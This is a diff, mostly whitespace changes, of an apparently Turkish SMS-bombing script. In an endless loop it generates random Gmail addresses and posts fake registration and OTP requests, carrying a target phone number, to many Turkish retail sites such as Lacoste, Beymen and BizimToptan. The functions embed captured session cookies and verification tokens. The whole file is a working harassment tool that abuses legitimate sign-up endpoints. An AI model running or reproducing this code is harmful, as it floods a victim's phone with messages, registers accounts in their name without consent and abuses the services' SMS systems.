@@ -11,38 +11,38 @@ ad = ""
 soyad = ""
 #kodu incelemek isteyenler en alt satırlardan başlayabilirler.
 while True:
-    
-    
-    try: 
-            a = ["a","b","c","d","e","f","g","h","i","j","k","l","m","no","p","q","r","s","t","u","v","w","x","y","z"]     
-            g = random.choice(a)
-            g1 = random.choice(a)
-            g2 = random.choice(a)
-            g3 = random.choice(a)
-            g4 = random.choice(a)
-            g5 = random.choice(a)
-            g6 = random.choice(a)
-            g7 = random.choice(a)
-            g8 = random.choice(a)
-            g9 = random.choice(a)
-            g10 = random.choice(a)
-            g15 = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10
-            mail = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10+"@gmail.com"
-            phone = str(phone)
-            t1 = phone[0]
-            t2 = phone[1]
-            t3 = phone[2]
-            t4 = phone[3]
-            t5 = phone[4]
-            t6 = phone[5]
-            t7 = phone[6]
-            t8 = phone[7]
-            t9 = phone[8]
-            t10 = phone[9]
+
+
+    try:
+        a = ["a","b","c","d","e","f","g","h","i","j","k","l","m","no","p","q","r","s","t","u","v","w","x","y","z"]
+        g = random.choice(a)
+        g1 = random.choice(a)
+        g2 = random.choice(a)
+        g3 = random.choice(a)
+        g4 = random.choice(a)
+        g5 = random.choice(a)
+        g6 = random.choice(a)
+        g7 = random.choice(a)
+        g8 = random.choice(a)
+        g9 = random.choice(a)
+        g10 = random.choice(a)
+        g15 = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10
+        mail = g+g1+g2+g3+g4+g5+g6+g7+g8+g9+g10+"@gmail.com"
+        phone = str(phone)
+        t1 = phone[0]
+        t2 = phone[1]
+        t3 = phone[2]
+        t4 = phone[3]
+        t5 = phone[4]
+        t6 = phone[5]
+        t7 = phone[6]
+        t8 = phone[7]
+        t9 = phone[8]
+        t10 = phone[9]
     except:pass
 
-    def vakko(): 
-        try:   
+    def vakko():
+        try:
             headers = {
                 'accept': 'application/json, text/plain, */*',
                 'accept-language': 'tr-TR,tr;q=0.9',
@@ -89,8 +89,8 @@ while True:
             print(Fore.LIGHTGREEN_EX + "[+]" + "Vakko ====> https://www.vakko.com/"+ Style.RESET_ALL)
         except:
             print(Fore.LIGHTRED_EX + "[-]" + "Vakko Arıza" + Style.RESET_ALL)
-         
-    def gap(): 
+
+    def gap():
         try:
             cookies = {
                 'sessionid': 'sxe9iuq0jim16wvhvze57y1h9k4ue9cw',
@@ -134,106 +134,106 @@ while True:
 
     def lacoste():
         try:
-                cookies = {
-                    'csrftoken': 'UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4',
-                    'ajs_user_id': 'null',
-                    'ajs_group_id': 'null',
-                    'ajs_anonymous_id': '%2260193404-341f-428f-9d11-7f1eb4e119bd%22',
-                    '_fbp': 'fb.2.1730775877923.20095060547759564',
-                    '_ga': 'GA1.1.1408481338.1730775883',
-                    '__zlcmid': '1Oan97w1G5ZtMLW',
-                    '_ga_3W2HP4NFKN': 'GS1.1.1730775883.1.1.1730775902.0.0.236591127',
-                    'OptanonAlertBoxClosed': '2024-11-05T03:05:06.423Z',
-                    'OptanonConsent': 'isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
-                }
+            cookies = {
+                'csrftoken': 'UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4',
+                'ajs_user_id': 'null',
+                'ajs_group_id': 'null',
+                'ajs_anonymous_id': '%2260193404-341f-428f-9d11-7f1eb4e119bd%22',
+                '_fbp': 'fb.2.1730775877923.20095060547759564',
+                '_ga': 'GA1.1.1408481338.1730775883',
+                '__zlcmid': '1Oan97w1G5ZtMLW',
+                '_ga_3W2HP4NFKN': 'GS1.1.1730775883.1.1.1730775902.0.0.236591127',
+                'OptanonAlertBoxClosed': '2024-11-05T03:05:06.423Z',
+                'OptanonConsent': 'isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
+            }
 
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    # 'cookie': 'csrftoken=UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2260193404-341f-428f-9d11-7f1eb4e119bd%22; _fbp=fb.2.1730775877923.20095060547759564; _ga=GA1.1.1408481338.1730775883; __zlcmid=1Oan97w1G5ZtMLW; _ga_3W2HP4NFKN=GS1.1.1730775883.1.1.1730775902.0.0.236591127; OptanonAlertBoxClosed=2024-11-05T03:05:06.423Z; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
-                    'origin': 'https://www.lacoste.com.tr',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.lacoste.com.tr/register/',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
+            headers = {
+                'accept': '*/*',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'cookie': 'csrftoken=UQ9sIdvMr3eINGgQOPBvdc8BGeFyclKi2oMrTs7VVx4eGpBP3eBaEPzn2gduGsn4; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id=%2260193404-341f-428f-9d11-7f1eb4e119bd%22; _fbp=fb.2.1730775877923.20095060547759564; _ga=GA1.1.1408481338.1730775883; __zlcmid=1Oan97w1G5ZtMLW; _ga_3W2HP4NFKN=GS1.1.1730775883.1.1.1730775902.0.0.236591127; OptanonAlertBoxClosed=2024-11-05T03:05:06.423Z; OptanonConsent=isGpcEnabled=0&datestamp=Tue+Nov+05+2024+06%3A05%3A06+GMT%2B0300+(GMT%2B03%3A00)&version=202409.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0004%3A1%2CC0001%3A1%2CC0003%3A1%2CC0002%3A1&AwaitingReconsent=false',
+                'origin': 'https://www.lacoste.com.tr',
+                'priority': 'u=1, i',
+                'referer': 'https://www.lacoste.com.tr/register/',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'x-requested-with': 'XMLHttpRequest',
+            }
 
-                data = {
-                    'email': f'{mail}',
-                    'password': 'asdqwoedqw€@@s_',
-                    'gender': 'male',
-                    'first_name': f'{ad}',
-                    'last_name': f'{soyad}',
-                    'phone': f'0{phone}',
-                    'date_of_birth': '2000-06-06',
-                    'email_allowed': 'true',
-                    'sms_allowed': 'true',
-                    'call_allowed': 'true',
-                    'is_allowed': 'true',
-                    'confirm': 'true',
-                    'permissions': 'true',
-                }
+            data = {
+                'email': f'{mail}',
+                'password': 'asdqwoedqw€@@s_',
+                'gender': 'male',
+                'first_name': f'{ad}',
+                'last_name': f'{soyad}',
+                'phone': f'0{phone}',
+                'date_of_birth': '2000-06-06',
+                'email_allowed': 'true',
+                'sms_allowed': 'true',
+                'call_allowed': 'true',
+                'is_allowed': 'true',
+                'confirm': 'true',
+                'permissions': 'true',
+            }
 
-                response = requests.post('https://www.lacoste.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Lacoste ====> https://www.lacoste.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://www.lacoste.com.tr/users/registration/', cookies=cookies, headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Lacoste ====> https://www.lacoste.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Lacoste Arıza"+ Style.RESET_ALL)  
+            print(Fore.LIGHTRED_EX + "[-]" + "Lacoste Arıza"+ Style.RESET_ALL)
 
     def bizimtoptan():
         try:
-                cookies = {
-                    'inCommerce.customer': '962f8657-bcf5-452e-bade-a18f55c3b474',
-                    '__RequestVerificationToken': '7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
-                }
+            cookies = {
+                'inCommerce.customer': '962f8657-bcf5-452e-bade-a18f55c3b474',
+                '__RequestVerificationToken': '7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
+            }
 
-                headers = {
-                    'accept': 'application/json, text/javascript, */*; q=0.01',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    # 'cookie': 'inCommerce.customer=962f8657-bcf5-452e-bade-a18f55c3b474; __RequestVerificationToken=7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
-                    'origin': 'https://www.bizimtoptan.com.tr',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.bizimtoptan.com.tr/register',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                    'x-newrelic-id': 'Vg4DUFZWARAGUlNVAwcPUg==',
-                    'x-requested-with': 'XMLHttpRequest',
-                }
+            headers = {
+                'accept': 'application/json, text/javascript, */*; q=0.01',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                # 'cookie': 'inCommerce.customer=962f8657-bcf5-452e-bade-a18f55c3b474; __RequestVerificationToken=7gpAg71-OJ8vuaCiaPd5BrHuV_31o1TqMC8KmAyJVmyM4qgMzuR9Pf4yyHc9RTfx9r85DLHd7pB8MPGXB_V-Qt7Q8-s1',
+                'origin': 'https://www.bizimtoptan.com.tr',
+                'priority': 'u=1, i',
+                'referer': 'https://www.bizimtoptan.com.tr/register',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+                'x-newrelic-id': 'Vg4DUFZWARAGUlNVAwcPUg==',
+                'x-requested-with': 'XMLHttpRequest',
+            }
 
-                data = {
-                    'FirstName': f'{ad}',
-                    'LastName': f'{soyad}',
-                    'Email': f'{mail}',
-                    'Password': 'asdjaskljA_2es',
-                    'AcceptConditionOfUsePolicy': 'true',
-                    'AcceptKVKK': 'true',
-                    'Newsletter': 'true',
-                    '__RequestVerificationToken': '-djD1kKv5abhynmrnOteZGdBsEBVmSbBH84JDVNQycfOngeeL1vtlOWCyhBgLFr5imeLukgwLO5J6mxiYO4ADGUwSEY1',
-                    'ConfirmPassword': 'asdjaskljA_2es',
-                    'Phone': f'{phone}',
-                }
+            data = {
+                'FirstName': f'{ad}',
+                'LastName': f'{soyad}',
+                'Email': f'{mail}',
+                'Password': 'asdjaskljA_2es',
+                'AcceptConditionOfUsePolicy': 'true',
+                'AcceptKVKK': 'true',
+                'Newsletter': 'true',
+                '__RequestVerificationToken': '-djD1kKv5abhynmrnOteZGdBsEBVmSbBH84JDVNQycfOngeeL1vtlOWCyhBgLFr5imeLukgwLO5J6mxiYO4ADGUwSEY1',
+                'ConfirmPassword': 'asdjaskljA_2es',
+                'Phone': f'{phone}',
+            }
 
-                response = requests.post('https://www.bizimtoptan.com.tr/Customer/RegisterPost', cookies=cookies, headers=headers, data=data)
-                print(Fore.LIGHTGREEN_EX + "[+]" + "BizimToptan ====> https://www.bizimtoptan.com.tr"+ Style.RESET_ALL)
+            response = requests.post('https://www.bizimtoptan.com.tr/Customer/RegisterPost', cookies=cookies, headers=headers, data=data)
+            print(Fore.LIGHTGREEN_EX + "[+]" + "BizimToptan ====> https://www.bizimtoptan.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "BizimToptan Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "BizimToptan Arıza"+ Style.RESET_ALL)
     def filemarket():
         try:
             cookies = {
-            'JSESSIONID': 'F567BAE9D62A4BBFC5413F8436657A9B.accstorefront-5d659f7fb4-sxk9n',
-            'ROUTE': '.accstorefront-5d659f7fb4-sxk9n',
+                'JSESSIONID': 'F567BAE9D62A4BBFC5413F8436657A9B.accstorefront-5d659f7fb4-sxk9n',
+                'ROUTE': '.accstorefront-5d659f7fb4-sxk9n',
             }
             url = "https://api.filemarket.com.tr:443/v1/otp/send"
             headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
@@ -241,82 +241,82 @@ while True:
             response = requests.post(url, headers=headers, json=json)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Filemarket ====> https://filemarket.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Filemarket Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Filemarket Arıza"+ Style.RESET_ALL)
     def kimgbister():
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone}"})
             print(Fore.LIGHTGREEN_EX + "[+]" + "Kimgbister ====> https://kimgbister.com."+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Kimgbister Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Kimgbister Arıza"+ Style.RESET_ALL)
     def beymen():
         try:
-                headers = {
-                    'accept': 'application/json, text/plain, */*',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/json',
-                    # 'cookie': 'Entegral.CookieKey.LanguageID=1; Entegral.CookieKey.ABTest.Widget=TypeB; __RequestVerificationToken=Cb4Fit3VNOUWy_UelcBx2qZ4ECyOSMlQsHkF_J1N9sycZ6gtkFakzuMQtsj7qY53u6BPou7y4Y8RMZAeHLMrTvEOY-rNReShWsI4VXJ2sd01; nlbi_2753670=iGyVATksyCokA26mzw+gmgAAAAAV3vWfPgYod4o7soPPdU+0; visid_incap_2753670=Nwr29kclQeW/OdKtMmsdgojaLGcAAAAAQUIPAAAAAABRV2IOKg4CuEJlTudGKmTL; incap_ses_1368_2753670=5AWQZavpj1cpBCSP1Rz8EojaLGcAAAAAlcq/QH+ROO9uqr3EyYY82Q==; FirstVisitDate=G+K0sK0NuhWzxh7Au0aRuD2628M+hOds9wpcc+9ht3w=; Entegral.CookieKey.CouponTicket=Hn7JUfT3LKGc2bu7Ha7px5cIkGP7RHn3VZEBBdGNAbg=; UserSessionId=e33e9ec3-2aac-4e50-a08c-3e1cfaf1867a; nlbi_2753670_2622607=QXMdL+tvc269a1vOzw+gmgAAAADFpZoFQFHMJZ+q4H71I3Wn; gender_type=1; nlbi_2753670_2930947=TkVdH/cNNy6HaX+azw+gmgAAAADs4aDpc5/nGnscaRqFLQQd; Entegral.CookieKey.AppType=spa; RequestVerificationToken=GN4RBin18Lr8nDJ-Rtz1ktWfdXFo5J0cp3EsM-kYcH94UxIRnJV98JYXecOQji6l2ZnK2F8jSys5v292YJJ1RCGA8cotsiZZl1aH0U-8XPA1; _dd_s=rum=2&id=3bca860c-82e0-4d70-9287-3e2cb07058a7&created=1730992955923&expire=1730993885695',
-                    'origin': 'https://www.beymen.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.beymen.com/tr/customer/register?returnUrl=/tr/customer',
-                    'requestverificationtoken': 'rtL2TLSv-kawCmu5V-ntq4fgNWtVG59bEeaSG4Bq7llzIQHVlQ9Y0Rlw9KXwEIZIKr3q7pRg5OlWbvjnyb1pQVD4G-yzRWkjsnEpmhfXUsQ1',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                }
+            headers = {
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/json',
+                # 'cookie': 'Entegral.CookieKey.LanguageID=1; Entegral.CookieKey.ABTest.Widget=TypeB; __RequestVerificationToken=Cb4Fit3VNOUWy_UelcBx2qZ4ECyOSMlQsHkF_J1N9sycZ6gtkFakzuMQtsj7qY53u6BPou7y4Y8RMZAeHLMrTvEOY-rNReShWsI4VXJ2sd01; nlbi_2753670=iGyVATksyCokA26mzw+gmgAAAAAV3vWfPgYod4o7soPPdU+0; visid_incap_2753670=Nwr29kclQeW/OdKtMmsdgojaLGcAAAAAQUIPAAAAAABRV2IOKg4CuEJlTudGKmTL; incap_ses_1368_2753670=5AWQZavpj1cpBCSP1Rz8EojaLGcAAAAAlcq/QH+ROO9uqr3EyYY82Q==; FirstVisitDate=G+K0sK0NuhWzxh7Au0aRuD2628M+hOds9wpcc+9ht3w=; Entegral.CookieKey.CouponTicket=Hn7JUfT3LKGc2bu7Ha7px5cIkGP7RHn3VZEBBdGNAbg=; UserSessionId=e33e9ec3-2aac-4e50-a08c-3e1cfaf1867a; nlbi_2753670_2622607=QXMdL+tvc269a1vOzw+gmgAAAADFpZoFQFHMJZ+q4H71I3Wn; gender_type=1; nlbi_2753670_2930947=TkVdH/cNNy6HaX+azw+gmgAAAADs4aDpc5/nGnscaRqFLQQd; Entegral.CookieKey.AppType=spa; RequestVerificationToken=GN4RBin18Lr8nDJ-Rtz1ktWfdXFo5J0cp3EsM-kYcH94UxIRnJV98JYXecOQji6l2ZnK2F8jSys5v292YJJ1RCGA8cotsiZZl1aH0U-8XPA1; _dd_s=rum=2&id=3bca860c-82e0-4d70-9287-3e2cb07058a7&created=1730992955923&expire=1730993885695',
+                'origin': 'https://www.beymen.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.beymen.com/tr/customer/register?returnUrl=/tr/customer',
+                'requestverificationtoken': 'rtL2TLSv-kawCmu5V-ntq4fgNWtVG59bEeaSG4Bq7llzIQHVlQ9Y0Rlw9KXwEIZIKr3q7pRg5OlWbvjnyb1pQVD4G-yzRWkjsnEpmhfXUsQ1',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            }
 
-                json_data = {
-                    'CustomerName': f'{ad} {soyad}',
-                    'EmailAddress': f'{mail}',
-                    'PhoneNumber': f'{phone}',
-                }
+            json_data = {
+                'CustomerName': f'{ad} {soyad}',
+                'EmailAddress': f'{mail}',
+                'PhoneNumber': f'{phone}',
+            }
 
-                response = requests.post(
-                    'https://www.beymen.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
-                    headers=headers,
-                    json=json_data,
-                )
-                print(Fore.LIGHTGREEN_EX + "[+]" + "Beymen ====> https://www.beymen.com.tr"+ Style.RESET_ALL)
+            response = requests.post(
+                'https://www.beymen.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
+                headers=headers,
+                json=json_data,
+            )
+            print(Fore.LIGHTGREEN_EX + "[+]" + "Beymen ====> https://www.beymen.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Beymen Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Beymen Arıza"+ Style.RESET_ALL)
     def beymenclub():
         try:
-                headers = {
-                    'accept': 'application/json, text/plain, */*',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/json',
-                    # 'cookie': 'Entegral.CookieKey.LanguageID=1; __RequestVerificationToken=h7qw6EoeZlIHvuI2U_LQmRQanSauFh-j8KXI_YXViCPxQK7Y1UNTNKrg30eHrIzXWzk5EgNYSE328EAznJr2kN8Y2EBpd8V5pgaaRaRcRkg1; nlbi_2755544=bzuUYnp/x1pkyc97i0xdhgAAAADiKERmmpzQEyP3wn4xQGxJ; visid_incap_2755544=cYBXYWQOSjGI27HzUX43K37aLGcAAAAAQUIPAAAAAABXayS5c+Lt14IeevnrkTtv; incap_ses_1368_2755544=KwQQV3kTWhlD6iOP1Rz8En7aLGcAAAAA2iGL0gBjiuqyeublNYOecA==; FirstVisitDate=JEGTt0Ne04blNc2/XwVRex/VQm7LnZuYbe1/DwU64uY=; UserSessionId=e696a0b1-542e-456d-80ab-95ba3c1f17de; Entegral.CookieKey.CouponTicket=wXIoduxN4ARaAwpu9qYwIWOYDnv31UAxArfGa04h7EE=; nlbi_2755544_2624542=BP/rcl6mZH3P6OBxi0xdhgAAAACKEogNs2HisEOMzkRw9Z5S; nlbi_2755544_2930906=0Z3vdyZwH2zCxsUTi0xdhgAAAABfny0pRcJuri1wxlzkiJga; Entegral.CookieKey.AppType=spa; RequestVerificationToken=kcLYssrJP0fU9mNXlwNcyO_FKHSyFflckVuOta3HqxYGRhM1Y1ty8A9m4AODxMW83UAYXTrV_QpLoarLWuanzhwWGB-zhXMg5pn347uWaFc1; _dd_s=rum=1&id=53d5bdb9-1b8a-4ad1-b54e-9a90f630157c&created=1730993041186&expire=1730994004500',
-                    'origin': 'https://www.beymenclub.com',
-                    'priority': 'u=1, i',
-                    'referer': 'https://www.beymenclub.com/tr/customer/register?returnUrl=/tr/customer',
-                    'requestverificationtoken': 'lPr5AEAxK9OnYr7YDjqkRn6nwuorLWk32JYfSNWd4k-2UguxOSql8QhFLJ_mxtLBzEGdWJFx9FJBGc2KLS60JSGh1cc9OtsxieO4FJCUwKU1',
-                    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
-                }
+            headers = {
+                'accept': 'application/json, text/plain, */*',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'content-type': 'application/json',
+                # 'cookie': 'Entegral.CookieKey.LanguageID=1; __RequestVerificationToken=h7qw6EoeZlIHvuI2U_LQmRQanSauFh-j8KXI_YXViCPxQK7Y1UNTNKrg30eHrIzXWzk5EgNYSE328EAznJr2kN8Y2EBpd8V5pgaaRaRcRkg1; nlbi_2755544=bzuUYnp/x1pkyc97i0xdhgAAAADiKERmmpzQEyP3wn4xQGxJ; visid_incap_2755544=cYBXYWQOSjGI27HzUX43K37aLGcAAAAAQUIPAAAAAABXayS5c+Lt14IeevnrkTtv; incap_ses_1368_2755544=KwQQV3kTWhlD6iOP1Rz8En7aLGcAAAAA2iGL0gBjiuqyeublNYOecA==; FirstVisitDate=JEGTt0Ne04blNc2/XwVRex/VQm7LnZuYbe1/DwU64uY=; UserSessionId=e696a0b1-542e-456d-80ab-95ba3c1f17de; Entegral.CookieKey.CouponTicket=wXIoduxN4ARaAwpu9qYwIWOYDnv31UAxArfGa04h7EE=; nlbi_2755544_2624542=BP/rcl6mZH3P6OBxi0xdhgAAAACKEogNs2HisEOMzkRw9Z5S; nlbi_2755544_2930906=0Z3vdyZwH2zCxsUTi0xdhgAAAABfny0pRcJuri1wxlzkiJga; Entegral.CookieKey.AppType=spa; RequestVerificationToken=kcLYssrJP0fU9mNXlwNcyO_FKHSyFflckVuOta3HqxYGRhM1Y1ty8A9m4AODxMW83UAYXTrV_QpLoarLWuanzhwWGB-zhXMg5pn347uWaFc1; _dd_s=rum=1&id=53d5bdb9-1b8a-4ad1-b54e-9a90f630157c&created=1730993041186&expire=1730994004500',
+                'origin': 'https://www.beymenclub.com',
+                'priority': 'u=1, i',
+                'referer': 'https://www.beymenclub.com/tr/customer/register?returnUrl=/tr/customer',
+                'requestverificationtoken': 'lPr5AEAxK9OnYr7YDjqkRn6nwuorLWk32JYfSNWd4k-2UguxOSql8QhFLJ_mxtLBzEGdWJFx9FJBGc2KLS60JSGh1cc9OtsxieO4FJCUwKU1',
+                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
+            }
 
-                json_data = {
-                    'CustomerName': f'{ad} {soyad}',
-                    'EmailAddress': f'{mail}',
-                    'PhoneNumber': f'{phone}',
-                }
+            json_data = {
+                'CustomerName': f'{ad} {soyad}',
+                'EmailAddress': f'{mail}',
+                'PhoneNumber': f'{phone}',
+            }
 
-                response = requests.post(
-                    'https://www.beymenclub.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
-                    headers=headers,
-                    json=json_data,
-                )
-                
-                print(Fore.LIGHTGREEN_EX + "[+]" + "BeymenClub ====> https://www.beymenclub.com.tr"+ Style.RESET_ALL)
+            response = requests.post(
+                'https://www.beymenclub.com/cop-api/customer/SendOtpMessageForNewCustomerPhoneVerification',
+                headers=headers,
+                json=json_data,
+            )
+
+            print(Fore.LIGHTGREEN_EX + "[+]" + "BeymenClub ====> https://www.beymenclub.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "BeymenClub Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "BeymenClub Arıza"+ Style.RESET_ALL)
     def wmf():
         try:
             response = requests.post("https://www.wmf.com.tr/users/register/", data={
@@ -332,45 +332,45 @@ while True:
             },)
             print(Fore.LIGHTGREEN_EX + "[+]" + "Wmf ====> https://www.wmf.com.tr"+ Style.RESET_ALL)
         except:
-                print(Fore.LIGHTRED_EX + "[-]" + "Wmf Arıza"+ Style.RESET_ALL)
+            print(Fore.LIGHTRED_EX + "[-]" + "Wmf Arıza"+ Style.RESET_ALL)
     def network():
         try:
-                headers = {
-                    'accept': '*/*',
-                    'accept-language': 'tr-TR,tr;q=0.9',
-                    'content-type': 'application/json',
